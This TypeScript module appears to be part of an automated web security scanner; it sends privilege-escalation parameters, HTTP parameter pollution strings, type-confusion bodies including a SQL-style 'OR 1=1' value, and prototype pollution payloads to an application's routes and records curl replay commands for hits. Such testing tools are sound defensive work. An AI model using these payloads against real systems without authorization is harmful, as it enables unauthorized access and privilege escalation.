/**
 * Parameter Manipulation Agent — privilege escalation via hidden params,
 * mass assignment, HTTP parameter pollution, type confusion, prototype pollution.
 *
 * All detection is deterministic (no AI).
 */

import { httpRequest } from "../utils/httpClient";

export interface ParameterFinding {
  route: string;
  attackType: "privilege-escalation" | "http-pollution" | "type-confusion" | "prototype-pollution";
  payload: string;
  evidence: string;
  severity: "critical" | "high" | "medium";
  checkType: string;
  curlReplay: string;
}

const PRIVILEGE_PARAMS = [
  { role: "admin" },
  { isAdmin: true },
  { admin: 1 },
  { is_admin: true },
  { userType: "administrator" },
  { _isAdmin: "true" },
  { permissions: "admin:*" },
  { access_level: 9999 },
  { group: "admin" },
];

// Type confusion test cases — wrong types for fields that expect specific types
const TYPE_CONFUSION_CASES = [
  { body: { email: ["admin@admin.com"], password: "pass" }, description: "Array for email field" },
  { body: { email: { admin: true }, password: "pass" }, description: "Object for email field" },
  { body: { email: "a@a.com", password: 0 }, description: "Number 0 for password (type juggling)" },
  { body: { email: "a@a.com", password: null }, description: "null password" },
  { body: { email: "a@a.com", password: true }, description: "Boolean true for password" },
  { body: { id: "1 OR 1=1", limit: "AAAA".repeat(100) }, description: "Oversized string in numeric field" },
];

// ── Strategy 1: Privilege escalation ─────────────────────────────────────────
async function testPrivilegeEscalation(
  baseUrl: string,
  route: string,
  method: string
): Promise<ParameterFinding[]> {
  const findings: ParameterFinding[] = [];
  const url = `${baseUrl}${route}`;

  for (const extraParams of PRIVILEGE_PARAMS) {
    // Via GET query params
    const queryStr = Object.entries(extraParams)
      .map(([k, v]) => `${k}=${encodeURIComponent(String(v))}`)
      .join("&");
    const sep = url.includes("?") ? "&" : "?";
    const getRes = await httpRequest(`${url}${sep}${queryStr}`, { timeoutMs: 8_000 });
    const getBodyLow = getRes.body.toLowerCase();

    if (
      getRes.status < 400 &&
      (getBodyLow.includes("admin") || getBodyLow.includes("elevated") || getBodyLow.includes("superuser"))
    ) {
      findings.push({
        route,
        attackType: "privilege-escalation",
        payload: queryStr,
        evidence: `Query-param privilege escalation: ${getRes.status} — elevated role indicators in response`,
        severity: "critical",
        checkType: "privilege-escalation-query",
        curlReplay: `curl -s "${url}${sep}${queryStr}"`,
      });
    }

    // Via POST body with injected privilege fields
    if (method === "POST") {
      const body = { email: "test@user.com", password: "testpass", ...extraParams };
      const postRes = await httpRequest(url, {
        method,
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(body),
        timeoutMs: 8_000,
      });
      const postBodyLow = postRes.body.toLowerCase();

      if (
        postRes.status < 400 &&
        (postBodyLow.includes("admin") || postBodyLow.includes("role") || postBodyLow.includes("elevated"))
      ) {
        findings.push({
          route,
          attackType: "privilege-escalation",
          payload: JSON.stringify(extraParams),
          evidence: `Body parameter escalation: response ${postRes.status} reflects elevated role after injection`,
          severity: "critical",
          checkType: "privilege-escalation-body",
          curlReplay: `curl -s -X POST "${url}" -H "Content-Type: application/json" -d '${JSON.stringify(body)}'`,
        });
      }
    }
  }
  return findings;
}

// ── Strategy 2: HTTP parameter pollution ─────────────────────────────────────
async function testParamPollution(baseUrl: string, route: string): Promise<ParameterFinding[]> {
  const findings: ParameterFinding[] = [];
  const url = `${baseUrl}${route}`;
  const sep = url.includes("?") ? "&" : "?";

  const pollutionTests = [
    `id=1&id=2&id=3`,
    `role=user&role=admin`,
    `email=user@user.com&email=admin@admin.com`,
    `page=1&page=0&page=-1`,
  ];

  for (const params of pollutionTests) {
    const res = await httpRequest(`${url}${sep}${params}`, { timeoutMs: 8_000 });
    if (res.status >= 500) {
      findings.push({
        route,
        attackType: "http-pollution",
        payload: params,
        evidence: `HTTP parameter pollution caused server error ${res.status}`,
        severity: "medium",
        checkType: "http-param-pollution",
        curlReplay: `curl -s "${url}${sep}${params}"`,
      });
    }
  }
  return findings;
}

// ── Strategy 3: Type confusion ────────────────────────────────────────────────
async function testTypeConfusion(
  baseUrl: string,
  route: string,
  method: string
): Promise<ParameterFinding[]> {
  const findings: ParameterFinding[] = [];
  if (method !== "POST") return findings;

  const url = `${baseUrl}${route}`;

  for (const { body, description } of TYPE_CONFUSION_CASES) {
    const res = await httpRequest(url, {
      method,
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(body),
      timeoutMs: 8_000,
    });

    // Server crash on wrong types = unsafe input handling
    if (res.status === 500) {
      findings.push({
        route,
        attackType: "type-confusion",
        payload: JSON.stringify(body),
        evidence: `Type confusion: server returned 500 on ${description}`,
        severity: "medium",
        checkType: "type-confusion-500",
        curlReplay: `curl -s -X POST "${url}" -H "Content-Type: application/json" -d '${JSON.stringify(body)}'`,
      });
    }

    // Successful auth response on malformed input = dangerous type coercion
    if (res.status >= 200 && res.status < 300) {
      const bodyLow = res.body.toLowerCase();
      if (bodyLow.includes("token") || bodyLow.includes("session") || bodyLow.includes("auth")) {
        findings.push({
          route,
          attackType: "type-confusion",
          payload: JSON.stringify(body),
          evidence: `Type confusion: successful auth response on malformed input — ${description}`,
          severity: "critical",
          checkType: "type-confusion-auth",
          curlReplay: `curl -s -X POST "${url}" -H "Content-Type: application/json" -d '${JSON.stringify(body)}'`,
        });
      }
    }
  }
  return findings;
}

// ── Strategy 4: Prototype pollution ──────────────────────────────────────────
async function testPrototypePollution(
  baseUrl: string,
  route: string,
  method: string
): Promise<ParameterFinding[]> {
  const findings: ParameterFinding[] = [];
  if (method !== "POST") return findings;

  const url = `${baseUrl}${route}`;
  const pollutionBodies = [
    `{"__proto__":{"isAdmin":true},"email":"test@test.com","password":"test"}`,
    `{"constructor":{"prototype":{"isAdmin":true}},"email":"t@t.com","password":"t"}`,
  ];

  for (const bodyStr of pollutionBodies) {
    const res = await httpRequest(url, {
      method,
      headers: { "Content-Type": "application/json" },
      body: bodyStr,
      timeoutMs: 8_000,
    });

    if (res.status < 400) {
      const bodyLow = res.body.toLowerCase();
      if (bodyLow.includes("admin") || bodyLow.includes("isadmin")) {
        findings.push({
          route,
          attackType: "prototype-pollution",
          payload: bodyStr,
          evidence: `Prototype pollution: admin flag reflected in ${res.status} response`,
          severity: "critical",
          checkType: "prototype-pollution",
          curlReplay: `curl -s -X POST "${url}" -H "Content-Type: application/json" -d '${bodyStr}'`,
        });
      }
    }
  }
  return findings;
}

/** Create parameter agent task definitions for a list of routes. */
export function createParameterTasks(routes: Array<{ path: string; methods: string[] }>) {
  return routes.map((route) => ({
    id: `param-${route.path.replace(/\//g, "-")}`,
    route: route.path,
    method: route.methods.includes("POST") ? "POST" : "GET",
    tests: ["privilege-escalation", "http-pollution", "type-confusion", "prototype-pollution"] as const,
  }));
}

/** Execute all parameter manipulation tests against a single route. */
export async function runParameterTests(
  baseUrl: string,
  route: { path: string; methods: string[] }
): Promise<ParameterFinding[]> {
  const method = route.methods.includes("POST") ? "POST" : "GET";
  const [privFindings, pollutionFindings, typeFindings, protoFindings] = await Promise.all([
    testPrivilegeEscalation(baseUrl, route.path, method),
    testParamPollution(baseUrl, route.path),
    testTypeConfusion(baseUrl, route.path, method),
    testPrototypePollution(baseUrl, route.path, method),
  ]);
  return [...privFindings, ...pollutionFindings, ...typeFindings, ...protoFindings];
}
